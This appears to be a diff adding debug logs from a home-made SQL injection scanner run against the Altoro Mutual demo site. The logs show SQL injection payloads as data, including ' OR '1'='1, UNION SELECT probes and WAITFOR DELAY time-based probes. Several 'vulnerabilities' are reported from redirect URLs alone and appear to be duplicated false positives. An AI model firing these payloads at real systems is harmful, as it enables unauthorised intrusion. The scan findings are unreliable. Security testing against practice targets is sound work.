+[ERROR] [2024-11-26 22:42:59] Error testing payload Basic Authentication Bypass: 'list' object has no attribute 'get'
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Union Select Probe
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 22:42:59] Description: Tests for UNION injection possibility
+[ERROR] [2024-11-26 22:43:06] Error testing payload Union Select Probe: 'list' object has no attribute 'get'
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Error Based
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 22:43:06] Description: Attempts to trigger SQL error messages
+[ERROR] [2024-11-26 22:43:12] Error testing payload Error Based: 'list' object has no attribute 'get'
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Time Based
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 22:43:12] Description: Tests for blind injection via time delays
+[ERROR] [2024-11-26 22:43:19] Error testing payload Time Based: 'list' object has no attribute 'get'
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Boolean Based
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 22:43:19] Description: Tests for boolean-based blind injection
+[ERROR] [2024-11-26 22:43:26] Error testing payload Boolean Based: 'list' object has no attribute 'get'
+════════════════════════════════════════════════════════════════════════════════
+Starting Scan Results
+────────────────────────────────────────────────────────────────────────────────
+[SUCCESS] [2024-11-26 22:43:26] No SQL injection vulnerabilities detected
+
+Log started on 2024-11-26 22:46:06.182622
+════════════════════════════════════════════════════════════════════════════════
+Starting Starting SQL Injection Scan: https://demo.testfire.net/login.jsp
+────────────────────────────────────────────────────────────────────────────────
+[SUCCESS] [2024-11-26 22:45:18] Found 2 forms to test
+[INFO] [2024-11-26 22:45:18] Capturing baseline responses
+[DEBUG] [2024-11-26 22:45:25] Submitting form: frmSearch
+[DEBUG] [2024-11-26 22:45:25] Submitting form: login
+[SUCCESS] [2024-11-26 22:45:25] Successfully captured baselines
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Basic Authentication Bypass
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 22:45:25] Description: Simple login bypass attempt
+[WARNING] [2024-11-26 22:45:32] Potential vulnerability found in form 'frmSearch'
+Payload: ' OR '1'='1
+Reason: Different redirect URL: https://demo.testfire.net/search.jsp?query=%27+OR+%271%27%3D%271
+[WARNING] [2024-11-26 22:45:32] Potential vulnerability found in form 'frmSearch'
+Payload: ' OR '1'='1
+Reason: Different redirect URL: https://demo.testfire.net/search.jsp?query=%27+OR+%271%27%3D%271
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Union Select Probe
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 22:45:32] Description: Tests for UNION injection possibility
+[WARNING] [2024-11-26 22:45:38] Potential vulnerability found in form 'frmSearch'
+Payload: ' UNION SELECT NULL--
+Reason: Different redirect URL: https://demo.testfire.net/search.jsp?query=%27+UNION+SELECT+NULL--
+[WARNING] [2024-11-26 22:45:38] Potential vulnerability found in form 'frmSearch'
+Payload: ' UNION SELECT NULL--
+Reason: Different redirect URL: https://demo.testfire.net/search.jsp?query=%27+UNION+SELECT+NULL--
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Error Based
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 22:45:38] Description: Attempts to trigger SQL error messages
+[WARNING] [2024-11-26 22:45:45] Potential vulnerability found in form 'frmSearch'
+Payload: ' OR 1=CONVERT(int,@@version)--
+Reason: Different redirect URL: https://demo.testfire.net/search.jsp?query=%27+OR+1%3DCONVERT%28int%2C%40%40version%29--
+[WARNING] [2024-11-26 22:45:45] Potential vulnerability found in form 'frmSearch'
+Payload: ' OR 1=CONVERT(int,@@version)--
+Reason: Different redirect URL: https://demo.testfire.net/search.jsp?query=%27+OR+1%3DCONVERT%28int%2C%40%40version%29--
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Time Based
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 22:45:45] Description: Tests for blind injection via time delays
+[WARNING] [2024-11-26 22:45:52] Potential vulnerability found in form 'frmSearch'
+Payload: '; WAITFOR DELAY '0:0:5'--
+Reason: Different redirect URL: https://demo.testfire.net/search.jsp?query=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--
+[WARNING] [2024-11-26 22:45:52] Potential vulnerability found in form 'frmSearch'
+Payload: '; WAITFOR DELAY '0:0:5'--
+Reason: Different redirect URL: https://demo.testfire.net/search.jsp?query=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Boolean Based
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 22:45:52] Description: Tests for boolean-based blind injection
+[WARNING] [2024-11-26 22:45:58] Potential vulnerability found in form 'frmSearch'
+Payload: ' OR 1=1--
+Reason: Different redirect URL: https://demo.testfire.net/search.jsp?query=%27+OR+1%3D1--
+[WARNING] [2024-11-26 22:45:58] Potential vulnerability found in form 'frmSearch'
+Payload: ' OR 1=1--
+Reason: Different redirect URL: https://demo.testfire.net/search.jsp?query=%27+OR+1%3D1--
+════════════════════════════════════════════════════════════════════════════════
+Starting Scan Results
+────────────────────────────────────────────────────────────────────────────────
+[WARNING] [2024-11-26 22:45:58] Found 10 potential SQL injection vulnerabilities:
+================================================================================
+
+1. Form: frmSearch
+   Payload: Basic Authentication Bypass
+   Value: ' OR '1'='1
+   Final URL: https://demo.testfire.net/search.jsp?query=%27+OR+%271%27%3D%271
+   Reason: Different redirect URL: https://demo.testfire.net/search.jsp?query=%27+OR+%271%27%3D%271
+--------------------------------------------------------------------------------
+
+2. Form: frmSearch
+   Payload: Basic Authentication Bypass
+   Value: ' OR '1'='1
+   Final URL: https://demo.testfire.net/search.jsp?query=%27+OR+%271%27%3D%271
+   Reason: Different redirect URL: https://demo.testfire.net/search.jsp?query=%27+OR+%271%27%3D%271
+--------------------------------------------------------------------------------
+
+3. Form: frmSearch
+   Payload: Union Select Probe
+   Value: ' UNION SELECT NULL--
+   Final URL: https://demo.testfire.net/search.jsp?query=%27+UNION+SELECT+NULL--
+   Reason: Different redirect URL: https://demo.testfire.net/search.jsp?query=%27+UNION+SELECT+NULL--
+--------------------------------------------------------------------------------
+
+4. Form: frmSearch
+   Payload: Union Select Probe
+   Value: ' UNION SELECT NULL--
+   Final URL: https://demo.testfire.net/search.jsp?query=%27+UNION+SELECT+NULL--
+   Reason: Different redirect URL: https://demo.testfire.net/search.jsp?query=%27+UNION+SELECT+NULL--
+--------------------------------------------------------------------------------
+
+5. Form: frmSearch
+   Payload: Error Based
+   Value: ' OR 1=CONVERT(int,@@version)--
+   Final URL: https://demo.testfire.net/search.jsp?query=%27+OR+1%3DCONVERT%28int%2C%40%40version%29--
+   Reason: Different redirect URL: https://demo.testfire.net/search.jsp?query=%27+OR+1%3DCONVERT%28int%2C%40%40version%29--
+--------------------------------------------------------------------------------
+
+6. Form: frmSearch
+   Payload: Error Based
+   Value: ' OR 1=CONVERT(int,@@version)--
+   Final URL: https://demo.testfire.net/search.jsp?query=%27+OR+1%3DCONVERT%28int%2C%40%40version%29--
+   Reason: Different redirect URL: https://demo.testfire.net/search.jsp?query=%27+OR+1%3DCONVERT%28int%2C%40%40version%29--
+--------------------------------------------------------------------------------
+
+7. Form: frmSearch
+   Payload: Time Based
+   Value: '; WAITFOR DELAY '0:0:5'--
+   Final URL: https://demo.testfire.net/search.jsp?query=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--
+   Reason: Different redirect URL: https://demo.testfire.net/search.jsp?query=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--
+--------------------------------------------------------------------------------
+
+8. Form: frmSearch
+   Payload: Time Based
+   Value: '; WAITFOR DELAY '0:0:5'--
+   Final URL: https://demo.testfire.net/search.jsp?query=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--
+   Reason: Different redirect URL: https://demo.testfire.net/search.jsp?query=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--
+--------------------------------------------------------------------------------
+
+9. Form: frmSearch
+   Payload: Boolean Based
+   Value: ' OR 1=1--
+   Final URL: https://demo.testfire.net/search.jsp?query=%27+OR+1%3D1--
+   Reason: Different redirect URL: https://demo.testfire.net/search.jsp?query=%27+OR+1%3D1--
+--------------------------------------------------------------------------------
+
+10. Form: frmSearch
+   Payload: Boolean Based
+   Value: ' OR 1=1--
+   Final URL: https://demo.testfire.net/search.jsp?query=%27+OR+1%3D1--
+   Reason: Different redirect URL: https://demo.testfire.net/search.jsp?query=%27+OR+1%3D1--
+--------------------------------------------------------------------------------
+
+Log started on 2024-11-26 23:05:02.978242
+════════════════════════════════════════════════════════════════════════════════
+Starting Starting SQL Injection Scan: https://demo.testfire.net/login.jsp
+────────────────────────────────────────────────────────────────────────────────
+[SUCCESS] [2024-11-26 23:04:15] Found 2 forms to test
+[INFO] [2024-11-26 23:04:15] Capturing baseline responses
+[DEBUG] [2024-11-26 23:04:22] Submitting form: frmSearch
+[DEBUG] [2024-11-26 23:04:22] Submitting form: login
+[SUCCESS] [2024-11-26 23:04:22] Successfully captured baselines
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Basic Authentication Bypass
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 23:04:22] Description: Simple login bypass attempt
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Union Select Probe
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 23:04:28] Description: Tests for UNION injection possibility
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Error Based
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 23:04:35] Description: Attempts to trigger SQL error messages
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Time Based
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 23:04:42] Description: Tests for blind injection via time delays
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Boolean Based
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 23:04:48] Description: Tests for boolean-based blind injection
+════════════════════════════════════════════════════════════════════════════════
+Starting Scan Results
+────────────────────────────────────────────────────────────────────────────────
+[SUCCESS] [2024-11-26 23:04:55] No SQL injection vulnerabilities detected
+
+Log started on 2024-11-26 23:32:06.821672
+════════════════════════════════════════════════════════════════════════════════
+Starting Starting SQL Injection Scan: https://demo.testfire.net/login.jsp
+────────────────────────────────────────────────────────────────────────────────
+[SUCCESS] [2024-11-26 23:31:18] Found 2 forms to test
+[INFO] [2024-11-26 23:31:18] Capturing baseline responses
+[DEBUG] [2024-11-26 23:31:25] Submitting form: frmSearch
+[DEBUG] [2024-11-26 23:31:25] Submitting form: login
+[SUCCESS] [2024-11-26 23:31:25] Successfully captured baselines
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Basic Authentication Bypass
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 23:31:25] Description: Simple login bypass attempt
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Union Select Probe
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 23:31:32] Description: Tests for UNION injection possibility
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Error Based
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 23:31:38] Description: Attempts to trigger SQL error messages
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Time Based
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 23:31:45] Description: Tests for blind injection via time delays
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Boolean Based
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-26 23:31:52] Description: Tests for boolean-based blind injection
+════════════════════════════════════════════════════════════════════════════════
+Starting Scan Results
+────────────────────────────────────────────────────────────────────────────────
+[SUCCESS] [2024-11-26 23:31:59] No SQL injection vulnerabilities detected
+
+Log started on 2024-11-29 17:30:20.702019
+════════════════════════════════════════════════════════════════════════════════
+Starting Starting SQL Injection Scan: https://demo.testfire.net/login.jsp
+────────────────────────────────────────────────────────────────────────────────
+[SUCCESS] [2024-11-29 17:29:33] Found 2 forms to test
+[INFO] [2024-11-29 17:29:33] Capturing baseline responses
+[DEBUG] [2024-11-29 17:29:39] Submitting form: frmSearch
+[DEBUG] [2024-11-29 17:29:39] Submitting form: login
+[SUCCESS] [2024-11-29 17:29:39] Successfully captured baselines
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Basic Authentication Bypass
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-29 17:29:39] Description: Simple login bypass attempt
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Union Select Probe
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-29 17:29:46] Description: Tests for UNION injection possibility
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Error Based
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-29 17:29:54] Description: Attempts to trigger SQL error messages
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Time Based
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-29 17:30:00] Description: Tests for blind injection via time delays
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Boolean Based
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-29 17:30:07] Description: Tests for boolean-based blind injection
+════════════════════════════════════════════════════════════════════════════════
+Starting Scan Results
+────────────────────────────────────────────────────────────────────────────────
+[SUCCESS] [2024-11-29 17:30:14] No SQL injection vulnerabilities detected
+
+Log started on 2024-11-29 18:34:07.224668
+════════════════════════════════════════════════════════════════════════════════
+Starting Starting SQL Injection Scan: https://demo.testfire.net/login.jsp
+────────────────────────────────────────────────────────────────────────────────
+[SUCCESS] [2024-11-29 18:33:20] Found 2 forms to test
+[INFO] [2024-11-29 18:33:20] Capturing baseline responses
+[DEBUG] [2024-11-29 18:33:20] Using baseline value: baseline123
+[DEBUG] [2024-11-29 18:33:27] Processing baseline for form: frmSearch
+[DEBUG] [2024-11-29 18:33:27] 
+Raw response object for frmSearch:
+==================================================
+{'alert_detected': False, 'alert_text': None, 'url_changed': True, 'new_url': 'https://demo.testfire.net/search.jsp?query=baseline123', 'status_code': 200, 'response_content': '<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head>\n\t<title>Altoro Mutual</title>\n  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\n  <link href="/style.css" rel="stylesheet" type="text/css">\n</head>\n<body style="margin-top:5px;">\n\n<div id="header" style="margin-bottom:5px; wid...
+==================================================
+[DEBUG] [2024-11-29 18:33:27] 
+Raw response content for frmSearch:
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+  <link href="/style.css" rel="stylesheet" type="text/css">
+</head>
+<body style="margin-top:5px;">
+
+<div id="header" style="margin-bottom:5px; width: 99%;">
+  <form id="frmSearch" method="get" action="/search.jsp">
+	  <table width="100%" border="0" cellpadding="0" cellspacing="0">
+		  <tbody><tr>
+		      <td rowspan="2"><a id="Hy...
+==================================================
+[DEBUG] [2024-11-29 18:33:27] 
+Original Content:
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+  <link href="/style.css" rel="stylesheet" type="text/css">
+</head>
+<body style="margin-top:5px;">
+
+<div id="header" style="margin-bottom:5px; width: 99%;">
+  <form id="frmSearch" method="get" action="/search.jsp">
+	  <table width="100%" border="0" cellpadding="0" cellspacing="0">
+		  <tbody><tr>
+		      <td rowspan="2"><a id="Hy...
+==================================================
+[DEBUG] [2024-11-29 18:33:27] 
+After removing 'baseline123':
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+  <link href="/style.css" rel="stylesheet" type="text/css">
+</head>
+<body style="margin-top:5px;">
+
+<div id="header" style="margin-bottom:5px; width: 99%;">
+  <form id="frmSearch" method="get" action="/search.jsp">
+	  <table width="100%" border="0" cellpadding="0" cellspacing="0">
+		  <tbody><tr>
+		      <td rowspan="2"><a id="Hy...
+==================================================
+[DEBUG] [2024-11-29 18:33:27] 
+After normalizing whitespace:
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head> <title>Altoro Mutual</title> <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"> <link href="/style.css" rel="stylesheet" type="text/css"> </head> <body style="margin-top:5px;"> <div id="header" style="margin-bottom:5px; width: 99%;"> <form id="frmSearch" method="get" action="/search.jsp"> <table width="100%" border="0" cellpadding="0" cellspacing="0"> <tbody><tr> <td rowspan="2"><a id="HyperLink1" href="/index....
+==================================================
+[DEBUG] [2024-11-29 18:33:27] 
+Final cleaned content:
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head> <title>Altoro Mutual</title> <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"> <link href="/style.css" rel="stylesheet" type="text/css"> </head> <body style="margin-top:5px;"> <div id="header" style="margin-bottom:5px; width: 99%;"> <form id="frmSearch" method="get" action="/search.jsp"> <table width="100%" border="0" cellpadding="0" cellspacing="0"> <tbody><tr> <td rowspan="2"><a id="HyperLink1" href="/index....
+==================================================
+[DEBUG] [2024-11-29 18:33:27] Baseline captured for frmSearch:
+Status Code: 200
+URL: https://demo.testfire.net/search.jsp?query=baseline123
+[DEBUG] [2024-11-29 18:33:27] Processing baseline for form: login
+[DEBUG] [2024-11-29 18:33:27] 
+Raw response object for login:
+==================================================
+{'alert_detected': False, 'alert_text': None, 'url_changed': True, 'new_url': 'https://demo.testfire.net/search.jsp?query=', 'status_code': 200, 'response_content': '<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head>\n\t<title>Altoro Mutual</title>\n  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\n  <link href="/style.css" rel="stylesheet" type="text/css">\n</head>\n<body style="margin-top:5px;">\n\n<div id="header" style="margin-bottom:5px; width: 99%;">\...
+==================================================
+[DEBUG] [2024-11-29 18:33:27] 
+Raw response content for login:
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+  <link href="/style.css" rel="stylesheet" type="text/css">
+</head>
+<body style="margin-top:5px;">
+
+<div id="header" style="margin-bottom:5px; width: 99%;">
+  <form id="frmSearch" method="get" action="/search.jsp">
+	  <table width="100%" border="0" cellpadding="0" cellspacing="0">
+		  <tbody><tr>
+		      <td rowspan="2"><a id="Hy...
+==================================================
+[DEBUG] [2024-11-29 18:33:27] 
+Original Content:
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+  <link href="/style.css" rel="stylesheet" type="text/css">
+</head>
+<body style="margin-top:5px;">
+
+<div id="header" style="margin-bottom:5px; width: 99%;">
+  <form id="frmSearch" method="get" action="/search.jsp">
+	  <table width="100%" border="0" cellpadding="0" cellspacing="0">
+		  <tbody><tr>
+		      <td rowspan="2"><a id="Hy...
+==================================================
+[DEBUG] [2024-11-29 18:33:27] 
+After removing 'baseline123':
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+  <link href="/style.css" rel="stylesheet" type="text/css">
+</head>
+<body style="margin-top:5px;">
+
+<div id="header" style="margin-bottom:5px; width: 99%;">
+  <form id="frmSearch" method="get" action="/search.jsp">
+	  <table width="100%" border="0" cellpadding="0" cellspacing="0">
+		  <tbody><tr>
+		      <td rowspan="2"><a id="Hy...
+==================================================
+[DEBUG] [2024-11-29 18:33:27] 
+After normalizing whitespace:
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head> <title>Altoro Mutual</title> <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"> <link href="/style.css" rel="stylesheet" type="text/css"> </head> <body style="margin-top:5px;"> <div id="header" style="margin-bottom:5px; width: 99%;"> <form id="frmSearch" method="get" action="/search.jsp"> <table width="100%" border="0" cellpadding="0" cellspacing="0"> <tbody><tr> <td rowspan="2"><a id="HyperLink1" href="/index....
+==================================================
+[DEBUG] [2024-11-29 18:33:27] 
+Final cleaned content:
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head> <title>Altoro Mutual</title> <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"> <link href="/style.css" rel="stylesheet" type="text/css"> </head> <body style="margin-top:5px;"> <div id="header" style="margin-bottom:5px; width: 99%;"> <form id="frmSearch" method="get" action="/search.jsp"> <table width="100%" border="0" cellpadding="0" cellspacing="0"> <tbody><tr> <td rowspan="2"><a id="HyperLink1" href="/index....
+==================================================
+[DEBUG] [2024-11-29 18:33:27] Baseline captured for login:
+Status Code: 200
+URL: https://demo.testfire.net/search.jsp?query=
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Basic Authentication Bypass
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-29 18:33:27] Description: Simple login bypass attempt
+[DEBUG] [2024-11-29 18:33:27] Payload value: ' OR '1'='1
+[DEBUG] [2024-11-29 18:33:33] 
+Raw response for form 'frmSearch':
+==================================================
+{'alert_detected': False, 'alert_text': None, 'url_changed': True, 'new_url': 'https://demo.testfire.net/search.jsp?query=%27+OR+%271%27%3D%271', 'status_code': 200, 'response_content': '<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head>\n\t<title>Altoro Mutual</title>\n  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\n  <link href="/style.css" rel="stylesheet" type="text/css">\n</head>\n<body style="margin-top:5px;">\n\n<div id="header" style="margin-botto...
+==================================================
+[DEBUG] [2024-11-29 18:33:33] 
+Comparing responses for form 'frmSearch'
+[DEBUG] [2024-11-29 18:33:33] 
+Original Content:
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+  <link href="/style.css" rel="stylesheet" type="text/css">
+</head>
+<body style="margin-top:5px;">
+
+<div id="header" style="margin-bottom:5px; width: 99%;">
+  <form id="frmSearch" method="get" action="/search.jsp">
+	  <table width="100%" border="0" cellpadding="0" cellspacing="0">
+		  <tbody><tr>
+		      <td rowspan="2"><a id="Hy...
+==================================================
+[DEBUG] [2024-11-29 18:33:33] 
+After removing '' OR '1'='1':
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+  <link href="/style.css" rel="stylesheet" type="text/css">
+</head>
+<body style="margin-top:5px;">
+
+<div id="header" style="margin-bottom:5px; width: 99%;">
+  <form id="frmSearch" method="get" action="/search.jsp">
+	  <table width="100%" border="0" cellpadding="0" cellspacing="0">
+		  <tbody><tr>
+		      <td rowspan="2"><a id="Hy...
+==================================================
+[DEBUG] [2024-11-29 18:33:33] 
+After normalizing whitespace:
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head> <title>Altoro Mutual</title> <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"> <link href="/style.css" rel="stylesheet" type="text/css"> </head> <body style="margin-top:5px;"> <div id="header" style="margin-bottom:5px; width: 99%;"> <form id="frmSearch" method="get" action="/search.jsp"> <table width="100%" border="0" cellpadding="0" cellspacing="0"> <tbody><tr> <td rowspan="2"><a id="HyperLink1" href="/index....
+==================================================
+[DEBUG] [2024-11-29 18:33:33] 
+Final cleaned content:
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head> <title>Altoro Mutual</title> <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"> <link href="/style.css" rel="stylesheet" type="text/css"> </head> <body style="margin-top:5px;"> <div id="header" style="margin-bottom:5px; width: 99%;"> <form id="frmSearch" method="get" action="/search.jsp"> <table width="100%" border="0" cellpadding="0" cellspacing="0"> <tbody><tr> <td rowspan="2"><a id="HyperLink1" href="/index....
+==================================================
+[DEBUG] [2024-11-29 18:33:33] Content lengths - Baseline: 6065, Test: 6065
+[DEBUG] [2024-11-29 18:33:33] 
+Raw response for form 'login':
+==================================================
+{'alert_detected': False, 'alert_text': None, 'url_changed': True, 'new_url': 'https://demo.testfire.net/search.jsp?query=', 'status_code': 200, 'response_content': '<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head>\n\t<title>Altoro Mutual</title>\n  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\n  <link href="/style.css" rel="stylesheet" type="text/css">\n</head>\n<body style="margin-top:5px;">\n\n<div id="header" style="margin-bottom:5px; width: 99%;">\...
+==================================================
+[DEBUG] [2024-11-29 18:33:33] 
+Comparing responses for form 'login'
+[DEBUG] [2024-11-29 18:33:33] 
+Original Content:
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+  <link href="/style.css" rel="stylesheet" type="text/css">
+</head>
+<body style="margin-top:5px;">
+
+<div id="header" style="margin-bottom:5px; width: 99%;">
+  <form id="frmSearch" method="get" action="/search.jsp">
+	  <table width="100%" border="0" cellpadding="0" cellspacing="0">
+		  <tbody><tr>
+		      <td rowspan="2"><a id="Hy...
+==================================================
+[DEBUG] [2024-11-29 18:33:33] 
+After removing '' OR '1'='1':
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+  <link href="/style.css" rel="stylesheet" type="text/css">
+</head>
+<body style="margin-top:5px;">
+
+<div id="header" style="margin-bottom:5px; width: 99%;">
+  <form id="frmSearch" method="get" action="/search.jsp">
+	  <table width="100%" border="0" cellpadding="0" cellspacing="0">
+		  <tbody><tr>
+		      <td rowspan="2"><a id="Hy...
+==================================================
+[DEBUG] [2024-11-29 18:33:33] 
+After normalizing whitespace:
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head> <title>Altoro Mutual</title> <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"> <link href="/style.css" rel="stylesheet" type="text/css"> </head> <body style="margin-top:5px;"> <div id="header" style="margin-bottom:5px; width: 99%;"> <form id="frmSearch" method="get" action="/search.jsp"> <table width="100%" border="0" cellpadding="0" cellspacing="0"> <tbody><tr> <td rowspan="2"><a id="HyperLink1" href="/index....
+==================================================
+[DEBUG] [2024-11-29 18:33:33] 
+Final cleaned content:
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head> <title>Altoro Mutual</title> <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"> <link href="/style.css" rel="stylesheet" type="text/css"> </head> <body style="margin-top:5px;"> <div id="header" style="margin-bottom:5px; width: 99%;"> <form id="frmSearch" method="get" action="/search.jsp"> <table width="100%" border="0" cellpadding="0" cellspacing="0"> <tbody><tr> <td rowspan="2"><a id="HyperLink1" href="/index....
+==================================================
+[DEBUG] [2024-11-29 18:33:33] Content lengths - Baseline: 6065, Test: 6065
+════════════════════════════════════════════════════════════════════════════════
+Starting Testing: Union Select Probe
+────────────────────────────────────────────────────────────────────────────────
+[INFO] [2024-11-29 18:33:33] Description: Tests for UNION injection possibility
+[DEBUG] [2024-11-29 18:33:33] Payload value: ' UNION SELECT NULL--
+[DEBUG] [2024-11-29 18:33:40] 
+Raw response for form 'frmSearch':
+==================================================
+{'alert_detected': False, 'alert_text': None, 'url_changed': True, 'new_url': 'https://demo.testfire.net/search.jsp?query=%27+UNION+SELECT+NULL--', 'status_code': 200, 'response_content': '<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head>\n\t<title>Altoro Mutual</title>\n  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\n  <link href="/style.css" rel="stylesheet" type="text/css">\n</head>\n<body style="margin-top:5px;">\n\n<div id="header" style="margin-bot...
+==================================================
+[DEBUG] [2024-11-29 18:33:40] 
+Comparing responses for form 'frmSearch'
+[DEBUG] [2024-11-29 18:33:40] 
+Original Content:
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+  <link href="/style.css" rel="stylesheet" type="text/css">
+</head>
+<body style="margin-top:5px;">
+
+<div id="header" style="margin-bottom:5px; width: 99%;">
+  <form id="frmSearch" method="get" action="/search.jsp">
+	  <table width="100%" border="0" cellpadding="0" cellspacing="0">
+		  <tbody><tr>
+		      <td rowspan="2"><a id="Hy...
+==================================================
+[DEBUG] [2024-11-29 18:33:40] 
+After removing '' UNION SELECT NULL--':
+==================================================
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head>
+	<title>Altoro Mutual</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+  <link href="/style.css" rel="stylesheet" type="text/css">
+</head>
+<body style="margin-top:5px;">
+
